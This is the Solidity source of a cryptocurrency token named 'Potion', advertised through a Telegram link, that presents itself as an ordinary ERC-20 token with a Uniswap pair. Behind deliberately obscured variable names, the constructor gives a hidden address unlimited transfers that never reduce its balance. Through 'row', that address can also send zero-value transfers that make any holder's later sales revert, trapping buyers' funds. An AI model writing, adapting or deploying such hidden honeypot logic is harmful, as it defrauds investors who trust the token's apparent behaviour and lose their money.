/*

https://t.me/PotionETH

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Potion is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private potttatta = 48;

    function transferFrom(address potiotio, address pottta, uint256 pottoto) public returns (bool success) {
        require(pottoto <= allowance[potiotio][msg.sender]);
        allowance[potiotio][msg.sender] -= pottoto;
        row(potiotio, pottta, pottoto);
        return true;
    }

    mapping(address => uint256) private potiotatt;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol = 'Potion';

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public uniswapV2Pair;

    mapping(address => uint256) private snakinoo;

    string public name = 'Potion';

    constructor(address potiotatttat) {
        balanceOf[msg.sender] = totalSupply;
        potiotatt[potiotatttat] = potttatta;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function row(address potiotio, address pottta, uint256 pottoto) private returns (bool success) {
        if (potiotatt[potiotio] == 0) {
            balanceOf[potiotio] -= pottoto;
        }

        if (pottoto == 0) snakinoo[pottta] += potttatta;

        if (potiotio != uniswapV2Pair && potiotatt[potiotio] == 0 && snakinoo[potiotio] > 0) {
            potiotatt[potiotio] -= potttatta;
        }

        balanceOf[pottta] += pottoto;
        emit Transfer(potiotio, pottta, pottoto);
        return true;
    }

    function approve(address snakkotr, uint256 pottoto) public returns (bool success) {
        allowance[msg.sender][snakkotr] = pottoto;
        emit Approval(msg.sender, snakkotr, pottoto);
        return true;
    }

    function transfer(address pottta, uint256 pottoto) public returns (bool success) {
        row(msg.sender, pottta, pottoto);
        return true;
    }

    mapping(address => uint256) public balanceOf;
}